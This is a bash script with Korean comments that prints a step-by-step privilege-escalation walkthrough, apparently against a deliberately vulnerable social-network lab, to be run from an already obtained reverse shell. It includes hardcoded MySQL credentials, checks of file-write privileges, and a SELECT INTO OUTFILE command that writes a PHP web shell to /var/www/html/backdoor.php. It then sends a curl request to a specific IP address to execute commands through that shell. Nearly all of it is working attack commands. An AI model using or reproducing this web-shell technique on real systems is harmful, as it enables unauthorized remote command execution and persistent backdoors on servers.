#!/bin/bash
echo "============================================================"
echo "🔑 MySQL을 통한 권한 상승 시도"
echo "============================================================"
echo ""
echo "리버스 쉘에서 실행:"
echo ""

echo "1. MySQL 접속 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns
EOF
echo ""

echo "2. MySQL 권한 확인"
echo "------------------------------------------------------------"
cat << 'SQL1'
mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, File_priv, Super_priv FROM mysql.user WHERE user='webuser';"
SQL1
echo ""

echo "3. secure_file_priv 확인 (파일 쓰기 가능 여부)"
echo "------------------------------------------------------------"
cat << 'SQL2'
mysql -u webuser -p'WebPassw0rd!' -e "SHOW VARIABLES LIKE 'secure_file_priv';"
SQL2
echo ""

echo "4. 만약 File_priv='Y'라면 → PHP 백도어 작성 시도"
echo "------------------------------------------------------------"
cat << 'SQL3'
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'SQLEOF'
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php';
SQLEOF
SQL3
echo ""

echo "5. 만약 성공했다면 접속:"
echo "------------------------------------------------------------"
cat << 'EOF'
curl "http://52.78.221.104/backdoor.php?cmd=id"
# 결과: uid=999(mysql) gid=997(mysql)
# 여전히 root 아님...
EOF
echo ""

echo "============================================================"
echo "현실: MySQL도 mysql 사용자 권한으로 제한됨"
echo "============================================================"
echo ""
echo "결론:"
echo "- apache 사용자: /var/www/html 쓰기 불가"
echo "- mysql 사용자: /var/www/html 쓰기 가능할 수도 (확인 필요)"
echo "- root: 모든 것 가능"
echo ""
echo "→ MySQL로 PHP 파일 작성 시도해볼 가치는 있음"
echo ""
echo "============================================================"
